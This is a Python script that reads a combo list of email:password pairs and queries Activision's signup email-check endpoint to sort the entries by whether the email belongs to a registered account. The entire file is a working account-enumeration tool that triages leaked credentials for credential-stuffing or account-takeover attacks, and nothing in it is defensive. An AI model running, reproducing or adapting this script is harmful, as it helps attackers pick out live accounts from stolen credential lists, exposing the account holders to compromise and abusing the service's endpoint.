import requests, os
from tqdm import tqdm


all_emails_file =  open(os.path.dirname(os.path.realpath(__file__)) + '/all_emails.txt', 'r')
valid_emails_file = open(os.path.dirname(os.path.realpath(__file__)) + '/valid_emails.txt', 'a')
unvalid_emails_file  = open(os.path.dirname(os.path.realpath(__file__)) + '/unvalid_emails.txt', 'a')

num_lines = sum(1 for _ in all_emails_file)
all_emails_file.seek(0)
url = 'https://s.activision.com/activision/signup/checkEmail'

num_valids = 0
for i in tqdm (range(num_lines),
               desc="Checking emails…",
               ascii=False, ncols=100):
    line = all_emails_file.readline()
    full_line = line.strip()
    if full_line == '':
        continue

    splited_full_line = full_line.split(':')
    username = splited_full_line[0]
    pasword = splited_full_line[1]

    params = {
        'email': username
    }

    response = requests.post(url, params=params)
    #print(response.url)
    if response.status_code != 200:
        print('failed, status:', response.text)
    else:
        json_response = response.json()

        if json_response['status'] == 'valid':
            valid_emails_file.write(full_line + '\n')
            valid_emails_file.flush()
        else:
            unvalid_emails_file.write(full_line + '\n')
            unvalid_emails_file.flush()